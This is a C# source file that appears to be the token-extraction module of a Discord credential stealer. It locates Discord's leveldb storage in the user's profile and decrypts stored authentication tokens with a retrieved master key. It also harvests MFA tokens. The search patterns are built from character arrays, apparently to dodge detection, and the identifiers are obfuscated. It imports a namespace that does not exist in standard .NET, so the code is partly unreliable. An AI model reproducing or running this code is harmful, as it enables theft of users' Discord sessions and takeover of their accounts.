using System;
using System.Collections.Generic;
using System.IO; // Used for file and directory operations (Path, Directory, File)
using System.Linq; // Used for LINQ methods like .Distinct(), .ToList()
using System.Text.RegularExpressions;
using System.Security.CredentialAccess;
using X.A;

namespace OdPS
{
    internal static class TX // TokenExtract
    {
        internal static List<string> GetTokens()
        {
            List<string> tokens = new List<string>();
            byte[] masterKey = KeyAcquirer.RetrieveSecretKey();

            if (masterKey == null)
                return tokens;

            string discordPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                "AppData", "Roaming", "discord", "Local Storage", "leveldb");

            if (!Directory.Exists(discordPath))
                return tokens;

            foreach (var file in Directory.GetFiles(discordPath, "*.ldb"))
            {
                try
                {
                    string content = File.ReadAllText(file);

                    foreach (Match m in Regex.Matches(content, BuildEncryptedTokenRegex()))
                    {
                        string base64 = m.Value.Split(':')[1].Trim('"');
                        string decrypted = Z.P(base64, masterKey);

                        if (!string.IsNullOrEmpty(decrypted))
                            tokens.Add(decrypted);
                    }

                    foreach (Match m in Regex.Matches(content, BuildMfaRegex()))
                    {
                        tokens.Add(m.Value);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error reading file {file}: {ex.Message}");
                }
            }

            return tokens.Distinct().ToList();
        }

        private static string BuildEncryptedTokenRegex()
        {
            var part1 = new char[] { 'd', 'Q', 'w', '4', 'w', '9', 'W', 'g', 'X', 'c', 'Q', ':' };
            var part2 = new char[] { '[', '^', '\\', '\"', ']' };
            return new string(part1) + new string(part2) + "+"; // Corrected pattern
        }

        private static string BuildMfaRegex()
        {
            var part1 = new char[] { 'm', 'f', 'a', '\\', '.', '[', '\\', 'w', '-', ']', '{', '8', '4', '}' };
            return new string(part1);
        }
    }
}
